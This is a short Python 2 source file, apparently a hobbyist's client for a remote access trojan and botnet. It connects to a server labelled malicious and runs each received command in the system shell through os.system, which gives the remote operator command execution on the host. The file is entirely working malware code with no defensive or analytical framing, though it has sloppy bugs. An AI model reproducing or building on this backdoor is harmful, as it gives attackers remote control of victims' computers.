# A Python RAT n' Botnet
#  by Landon in Python2
#    CLIENT-SIDE C0DE

import socket, os

bigBro = '127.0.0.1' # Malicious Server IP.

clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientSocket.connect(( bigBro, 8080 )) # To-do: Change port later. 

class commands:
    def log( output ): # Outputs to console.
        print( output )

    def shell(command):
        os.system(command)

turnedOn = True
while turnedOn:
    message = clientSocket.recv(2048)

    if message == "kill": turnedOn = False

    message = message.split(" ", 1)

    if len(message) == 2:
        command, arg = message

    if command in commands.__dict__:
        commands.__dict__[command]( arg )

clientSocket.close()